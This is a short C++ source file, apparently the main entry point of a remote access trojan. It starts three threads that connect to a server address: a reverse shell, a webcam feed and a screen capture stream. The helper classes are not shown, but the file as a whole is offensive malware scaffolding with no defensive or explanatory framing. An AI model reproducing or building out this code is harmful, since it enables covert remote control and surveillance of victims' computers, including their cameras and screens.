#include "Shell.h"
#include "Camera.h"
#include "Screen.h"

int main() {
	Shell* shell = new Shell((char*)SERVER_IP, REVSHELL_PORT);
	Camera* camera = new Camera((char*)SERVER_IP, CAMERA_PORT);
	Screen* screen = new Screen((char*)SERVER_IP, SCREEN_PORT);

//	screen->run();
	thread revshell(&Shell::run, shell);
	thread camerar(&Camera::run, camera);
	thread screenr(&Screen::run, screen);

	screenr.join();
	camerar.join();
	revshell.join();

	return 0;
}
